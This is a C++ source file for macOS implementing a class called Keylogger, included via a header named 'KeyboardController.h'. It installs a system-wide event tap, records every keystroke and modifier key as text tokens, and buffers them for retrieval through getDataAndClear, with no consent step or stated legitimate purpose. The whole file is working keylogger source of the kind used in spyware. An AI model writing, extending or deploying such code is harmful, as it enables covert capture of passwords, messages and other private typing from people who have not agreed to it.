#include "KeyboardController.h"
#ifdef __APPLE__

std::vector<std::string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false), _tapProxy(nullptr), _runLoopRef(nullptr) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer.push_back(str);
}

CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    Keylogger* logger = static_cast<Keylogger*>(refcon);
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    CGEventFlags flags = CGEventGetFlags(event);

    // bool isShift = (flags & kCGEventFlagMaskShift);
    // bool isCaps = (flags & kCGEventFlagMaskAlphaShift);

    if (type == kCGEventFlagsChanged) {
        if (keyCode == kVK_CapsLock) {
            logger->append("[CAPS]");
            return event;
        }
        static std::map<CGKeyCode, std::string> modMap = {
            {kVK_Shift, "[L-SHIFT]"}, {60, "[R-SHIFT]"},
            {kVK_Command, "[L-CMD]"}, {54, "[R-CMD]"},
            {kVK_Option, "[L-ALT]"},  {kVK_RightOption, "[R-ALT]"},
            {kVK_Control, "[L-CTRL]"},{62, "[R-CTRL]"},
            {kVK_CapsLock, "[CAPS]"},
            {63, "[FN]"}
        };

        if (modMap.count(keyCode)) {
            bool isDown = false;
            if (keyCode == kVK_Shift || keyCode == 60) isDown = (flags & kCGEventFlagMaskShift);
            else if (keyCode == kVK_Command || keyCode == 54) isDown = (flags & kCGEventFlagMaskCommand);
            else if (keyCode == kVK_Option || keyCode == kVK_RightOption) isDown = (flags & kCGEventFlagMaskAlternate);
            else if (keyCode == kVK_Control || keyCode == 62) isDown = (flags & kCGEventFlagMaskControl);
            else if (keyCode == kVK_CapsLock) isDown = (flags & kCGEventFlagMaskAlphaShift);
            else if (keyCode == 63) isDown = (flags & kCGEventFlagMaskSecondaryFn);
            
            if (isDown) {
                logger->_currentModCode = keyCode;
                logger->_modUsedAsCombo = false;
            } else {
                if (logger->_currentModCode == keyCode && !logger->_modUsedAsCombo) {
                    logger->append(modMap[keyCode]);
                }
                logger->_currentModCode = 0;
            }
        }
        return event;
    }

    if (type == kCGEventKeyDown) {
        switch (keyCode) {
            case kVK_Return:       logger->append("[RETURN]"); return event;
            case kVK_Delete:       logger->append("[DELETE]"); return event;
            case kVK_Space:        logger->append(" "); return event;
            case kVK_Tab:          logger->append("[TAB]"); return event;
            case kVK_Escape:       logger->append("[ESC]"); return event;
            case kVK_UpArrow:      logger->append("[UP]"); return event;
            case kVK_DownArrow:    logger->append("[DOWN]"); return event;
            case kVK_LeftArrow:    logger->append("[LEFT]"); return event;
            case kVK_RightArrow:   logger->append("[RIGHT]"); return event;

            case kVK_F1: logger->append("[F1]"); return event; case kVK_F2: logger->append("[F2]"); return event;
            case kVK_F3: logger->append("[F3]"); return event; case kVK_F4: logger->append("[F4]"); return event;
            case kVK_F5: logger->append("[F5]"); return event; case kVK_F6: logger->append("[F6]"); return event;
            case kVK_F7: logger->append("[F7]"); return event; case kVK_F8: logger->append("[F8]"); return event;
            case kVK_F9: logger->append("[F9]"); return event; case kVK_F10: logger->append("[F10]"); return event;
            case kVK_F11: logger->append("[F11]"); return event; case kVK_F12: logger->append("[F12]"); return event;
        }
        
        UniChar characters[8];
        UniCharCount actualLength;
        CGEventKeyboardGetUnicodeString(event, 8, &actualLength, characters);

        if (actualLength > 0) {
            std::string result = "";
            for (UniCharCount i = 0; i < actualLength; i++) {
                result += (char)characters[i];
            }
            logger->append(result);
        }
    }

    return event;
}

void Keylogger::MacLoop() {
    CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged);
    _tapProxy = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, eventMask, CGEventCallback, this);
    
    if (!_tapProxy) {
        std::cerr << "[KEY_MAC] Failed to create event tap. Check Accessibility permissions!\n";
        _isRunning = false;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, _tapProxy, 0);
    _runLoopRef = CFRunLoopGetCurrent();
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(_tapProxy, true);
    std::cout << "[KEY_MAC] Keylogger is running...\n";
    CFRunLoopRun();
    CFRelease(runLoopSource);
    CFRelease(_tapProxy);
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->MacLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (_runLoopRef) {
        CFRunLoopStop(_runLoopRef);
        _runLoopRef = nullptr;
    }

    if (_workerThread.joinable()) {
        _workerThread.join();
    }
}

std::vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.empty()) return {};
    std::vector<std::string> copy = std::move(_buffer);
    _buffer.clear();
    return copy;
}

#endif